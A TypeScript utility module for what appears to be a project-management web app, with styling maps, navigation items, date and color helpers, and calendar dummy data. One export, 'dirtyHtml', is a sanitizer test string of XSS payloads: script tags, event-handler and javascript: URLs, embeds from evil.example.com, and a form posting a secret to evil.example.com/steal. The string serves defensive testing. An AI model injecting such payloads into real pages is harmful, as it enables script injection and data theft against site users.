import { clsx, type ClassValue } from "clsx";
import { twMerge } from "tailwind-merge";
import { BarChart3, Calendar, FolderOpen, Home, Settings, Users } from "lucide-react";
import { ProjectRoles } from "@/types";

export const projectStatusColor = {
  Completed: "bg-green-100 text-green-700 dark:bg-green-900 dark:text-green-300",
  "On-hold": "bg-yellow-100 text-yellow-700 dark:bg-yellow-900 dark:text-yellow-300",
  "In Progress": "bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300",
  Planning: "bg-purple-100 text-purple-700 dark:bg-purple-900 dark:text-purple-300",
  Review: "bg-orange-100 text-orange-700 dark:bg-orange-900 dark:text-orange-300",
} as const;

export const taskPriorityColor = {
  low: "bg-green-100 text-green-700 dark:bg-green-900 dark:text-green-300",
  medium: "bg-yellow-100 text-yellow-700 dark:bg-yellow-900 dark:text-yellow-300",
  high: "bg-red-100 text-red-700 dark:bg-red-900 dark:text-red-300",
} as const;

export const listColor = {
  BLUE: "bg-[#0969da]/15 text-[#0969da] dark:bg-[#1f6feb]/20 dark:text-[#1f6feb]",
  GRAY: "bg-[#59636e]/15 text-[#59636e] dark:bg-[#6e7681]/20 dark:text-[#6e7681]",
  GREEN: "bg-[#1f883d]/15 text-[#1f883d] dark:bg-[#238636]/20 dark:text-[#238636]",
  ORANGE: "bg-[#bc4c00]/15 text-[#bc4c00] dark:bg-[#bd561d]/20 dark:text-[#bd561d]",
  PINK: "bg-[#bf3989]/15 text-[#bf3989] dark:bg-[#bf4b8a]/20 dark:text-[#bf4b8a]",
  PURPLE: "bg-[#8250df]/15 text-[#8250df] dark:bg-[#8957e5]/20 dark:text-[#8957e5]",
  RED: "bg-[#cf222e]/15 text-[#cf222e] dark:bg-[#da3633]/20 dark:text-[#da3633]",
  YELLOW: "bg-[#9a6700]/15 text-[#9a6700] dark:bg-[#9e6a03]/20 dark:text-[#9e6a03]",
} as const;

// Role Ranking
export const ROLE_RANK: Record<ProjectRoles, number> = {
  "Project Member": 1,
  "Project Manager": 2,
};

// Projects Search Filter Options
export const projectsFilterOptions = ["Ascending (A-Z)", "Descending (Z-A)", "Newest First", "Oldest First"] as const;

// Navigation Sidebar options
export const navigationItems = [
  { name: "Dashboard", href: "/dashboard", icon: Home, current: false },
  { name: "Projects", href: "/projects", icon: FolderOpen, current: false },
  { name: "Teams", href: "/teams", icon: Users, current: false },
  { name: "Analytics", href: "/analytics", icon: BarChart3, current: false },
  { name: "Calendar", href: "/calendar", icon: Calendar, current: false },
  { name: "Settings", href: "/settings", icon: Settings, current: false },
];

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}
export function areStringArraysEqual(a: string[] | null, b: string[] | null): boolean {
  if (a === null && b === null) return true;
  if (a === null || b === null) return false;
  if (a.length !== b.length) return false;

  return a.every((val, index) => val === b[index]);
}

export function capitalize(string: string): string {
  if (string.length === 0) return string;
  return string[0].toUpperCase() + string.slice(1);
}

export function getTempId(): number {
  const tempId = -Math.floor(Math.random() * 1e9); // negative temp id to avoid collisions
  return tempId;
}

export type OverdueInfo = {
  isOverdue: boolean; // true if due date is before today (by whole days)
  isDueToday: boolean; // true if due date is today (calendar day)
  daysOverdue: number; // whole days overdue (0 if not overdue)
  daysLeft: number; // how many whole days left till overdue (0 if overdue)
};

export function calculateOverdueInfo(dueInput: Date | null): OverdueInfo {
  if (!dueInput) return { isOverdue: false, daysOverdue: 0, daysLeft: 0, isDueToday: false };

  const due = dueInput;
  if (isNaN(due.getTime())) return { isOverdue: false, daysOverdue: 0, daysLeft: 0, isDueToday: false };

  const startOf = (d: Date) => new Date(d.getFullYear(), d.getMonth(), d.getDate()); // Helper func to strip the time off, so that we avoid off-by-hours bugs.
  const today = startOf(new Date());
  const dueDay = startOf(due);

  const MS_PER_DAY = 86_400_000;
  const diffMs = today.getTime() - dueDay.getTime(); // milliseconds difference
  const diffDays = Math.floor(diffMs / MS_PER_DAY); // whole-day difference

  return {
    isDueToday: diffDays === 0, // is Due Today
    isOverdue: diffDays > 0, // Overdue by how many days
    daysOverdue: diffDays > 0 ? diffDays : 0, // Was Due in |diffDays| days
    daysLeft: diffDays < 0 ? -diffDays : 0, // Will be Due in |diffDays| days
  };
}

export function calculateDaysPassed(createdAt: Date | null): { daysAgo: number } {
  if (!createdAt) return { daysAgo: 0 };

  const whenCreated = createdAt;
  if (isNaN(whenCreated.getTime())) return { daysAgo: 0 };

  const startOf = (d: Date) => new Date(d.getFullYear(), d.getMonth(), d.getDate()); // Helper func to strip the time off, so that we avoid off-by-hours bugs.
  const today = startOf(new Date());
  const createdDay = startOf(createdAt);

  const MS_PER_DAY = 86_400_000;
  const diffMs = today.getTime() - createdDay.getTime(); // milliseconds difference
  const diffDays = Math.floor(diffMs / MS_PER_DAY); // whole-day difference

  return { daysAgo: diffDays };
}

// Determine whether to use a light or dark fg given hexcolor bg
type ContrastResult = {
  result: "black" | "white";
};

export function getContrastYIQ(hexcolor: string): ContrastResult {
  // Ensure hex starts with "#"
  if (!hexcolor.startsWith("#")) {
    throw new Error("Invalid hex color: must start with '#'");
  }

  // Expand shorthand like #fff → #ffffff
  if (hexcolor.length === 4) {
    hexcolor = "#" + hexcolor[1] + hexcolor[1] + hexcolor[2] + hexcolor[2] + hexcolor[3] + hexcolor[3];
  }

  const r = parseInt(hexcolor.substring(1, 3), 16);
  const g = parseInt(hexcolor.substring(3, 5), 16);
  const b = parseInt(hexcolor.substring(5, 7), 16);

  const yiq = (r * 299 + g * 587 + b * 114) / 1000;
  const result: "black" | "white" = yiq >= 128 ? "black" : "white";

  return { result };
}

export function formatDate(date: Date | string): string {
  return new Date(date).toLocaleDateString("en-US", {
    year: "numeric",
    month: "short",
    day: "numeric",
  });
}

export function initials(name?: string) {
  if (!name) return "NA";
  const parts = name.trim().split(/\s+/);
  return (parts[0]?.[0] ?? "").concat(parts[1]?.[0] ?? "").toUpperCase() || name.slice(0, 2).toUpperCase();
}

// Test sanitizer
export const dirtyHtml = `
<div id="wrap">
  <h1 onclick="alert('XSS!')">Hello <em>world</em></h1>
  <p>Normal text <strong>bold</strong> and <em>italic</em>.</p>

  <!-- Dangerous links -->
  <a href="javascript:alert('XSS via href')">JS link</a>
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnREFUQScpPC9zY3JpcHQ+" target="_blank">data: link</a>
  <a href="https://example.com" target="_blank">Legit link</a>

  <!-- Image/event handlers -->
  <img src="x" onerror="alert('img onerror XSS')" />
  <img src="https://picsum.photos/200" alt="ok" />

  <!-- Inline styles & CSS url() -->
  <p style="background-image:url(javascript:alert('css-url'));color:expression(alert('ie'));">
    Styled text
  </p>

  <!-- Disallowed/complex embeds -->
  <iframe src="https://evil.example.com" width="560" height="315"></iframe>
  <object data="https://evil.example.com/payload" type="text/html"></object>
  <video src="x" onplay="alert('video onplay')"></video>

  <!-- SVG/script/mathy stuff -->
  <svg><script>alert('svg script')</script></svg>
  <math><mi>x</mi><script>alert('math script')</script></math>

  <!-- Form posting elsewhere -->
  <form action="https://evil.example.com/steal" method="post">
    <input name="secret" value="top-secret" />
    <button type="submit">Submit</button>
  </form>

  <!-- Newer HTML with events -->
  <details ontoggle="alert('ontoggle')">
    <summary>More</summary>
    <p>Hidden detail</p>
  </details>

  <!-- Odd tags & comments -->
  <marquee>Weee</marquee>
  <custom-tag beep="boop">Custom content</custom-tag>
  <!-- HTML comment should be removed or preserved depending on config -->
</div>

<style>body { background: red; }</style>
<script>alert('top-level script tag')</script>
`;

export const calendarDummyDates = [
  /* {
    id: 0,
    title: 'All Day Event very long title',
    allDay: true,
    start: new Date(2015, 3, 0),
    end: new Date(2015, 3, 1),
  }, */
  {
    id: 1,
    title: "Long Event",
    start: new Date(2025, 3, 7),
    end: new Date(2025, 3, 10),
  },

  {
    id: 2,
    title: "DTS STARTS",
    start: new Date(2025, 2, 13, 0, 0, 0),
    end: new Date(2025, 2, 20, 0, 0, 0),
  },

  {
    id: 3,
    title: "DTS ENDS",
    start: new Date(2025, 10, 6, 0, 0, 0),
    end: new Date(2025, 10, 13, 0, 0, 0),
  },

  {
    id: 4,
    title: "Some Event",
    start: new Date(2025, 3, 9, 0, 0, 0),
    end: new Date(2025, 3, 9, 0, 0, 0),
    allDay: true,
  },
];

// Filter out any audits rows we do not need for dashboard
export function keepForDashboard(action: string) {
  if (action.endsWith("_CREATED")) return true;
  if (action.endsWith("_UPDATED")) return true;
  if (action.endsWith("_DELETED")) return true;

  if (action === "TASK_MEMBER_ASSIGNED") return true;
  if (action === "TASK_MEMBER_REMOVED") return true;
  if (action === "PROJECT_TEAM_ADDED") return true;
  if (action === "PROJECT_TEAM_REMOVED") return true;
  if (action === "COMMENT_CREATED") return true;

  return false;
}

export const COLOR_TOKENS = [
  "var(--chart-1)",
  "var(--chart-2)",
  "var(--chart-3)",
  "var(--chart-4)",
  "var(--chart-5)",
  "var(--chart-6)",
  "var(--chart-7)",
  "var(--chart-8)",
  "var(--chart-9)",
  "var(--chart-10)",
  "var(--chart-11)",
  "var(--chart-12)",
  "var(--chart-13)",
  "var(--chart-14)",
  "var(--chart-15)",
];
